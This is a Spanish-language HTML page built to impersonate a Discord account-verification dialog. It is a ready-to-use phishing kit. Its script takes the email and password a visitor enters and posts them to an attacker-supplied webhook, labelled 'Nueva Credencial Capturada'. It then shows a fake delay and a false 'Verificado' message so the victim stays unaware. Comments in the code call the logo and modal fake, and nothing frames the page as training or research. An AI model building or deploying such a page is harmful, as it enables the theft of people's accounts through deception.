<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verificación</title>
    <style>
        /* Fuente oficial de Discord */
        @import url('https://fonts.cdnfonts.com/css/ggsans');

        body {
            background-color: rgba(32, 34, 37, 0.6); /* Fondo oscuro semitransparente */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        /* La "Ventana Modal" falsa */
        .modal {
            background-color: #36393f;
            width: 400px;
            padding: 32px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            text-align: center;
            position: relative;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        h2 {
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        p {
            color: #b5bbbc;
            font-size: 14px;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 16px;
        }

        label {
            display: block;
            color: #b5bbbc;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            background-color: #202225;
            border: 1px solid #202225;
            border-radius: 3px;
            padding: 10px;
            color: #dbdee1;
            font-size: 16px;
            transition: border 0.1s ease;
            box-sizing: border-box;
        }

        input:focus {
            border-color: #7289da;
            outline: none;
        }

        button {
            width: 100%;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 3px;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover { background-color: #5f73b4; }

        .spinner {
            display: none;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #fff;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #72767d;
        }
        
        /* Logo falso de Discord */
        .discord-logo {
            width: 40px;
            height: 40px;
            background-color: #5865F2;
            border-radius: 50%;
            margin: 0 auto 16px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 24px;
        }
    </style>
</head>
<body>

    <div class="modal">
        <!-- Logo simulado -->
        <div class="discord-logo">D</div>
        
        <h2>Verificación de Cuenta</h2>
        <p>Tu cuenta necesita ser verificada para acceder al contenido exclusivo del servidor.</p>
        
        <form id="loginForm">
            <div class="input-group">
                <label for="email">Correo Electrónico</label>
                <input type="text" id="email" name="email" autocomplete="off" required placeholder="ejemplo@correo.com">
            </div>
            
            <div class="input-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required placeholder="••••••••">
            </div>

            <button type="submit" id="btn-submit">Continuar</button>
            <div class="spinner" id="spinner"></div>
        </form>
        
        <div class="footer">Discord Inc. &copy; 2024</div>
    </div>

    <script>
        // CONFIGURACIÓN: PEGA AQUÍ TU WEBHOOK
        const WEBHOOK_URL = 'TU_WEBHOOK_AQUI'; 

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('btn-submit');
            const spinner = document.getElementById('spinner');

            // Efecto de carga
            btn.style.display = 'none';
            spinner.style.display = 'block';

            try {
                // 1. Enviar datos al Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔒 Nueva Credencial Capturada",
                            color: 5763719, // Verde Discord
                            fields: [
                                { name: "📧 Email", value: email, inline: true },
                                { name: "🔑 Password", value: password, inline: true },
                                { name: "🕒 Hora", value: new Date().toLocaleString() }
                            ],
                            footer: { text: "Guardian System v2.1" }
                        }]
                    })
                });

                // 2. Simular retardo realista (2 segundos)
                await new Promise(r => setTimeout(r, 2000));

                // 3. Mensaje de éxito
                document.querySelector('.modal').innerHTML = `
                    <div style="color: #43b581; font-size: 48px; margin-bottom: 16px;">✓</div>
                    <h2>¡Verificado!</h2>
                    <p>Tu cuenta ha sido verificada correctamente.<br>Puedes cerrar esta ventana.</p>
                `;

            } catch (error) {
                console.error(error);
                alert("Error de conexión.");
                spinner.style.display = 'none';
                btn.style.display = 'block';
            }
        });
    </script>
</body>
</html>
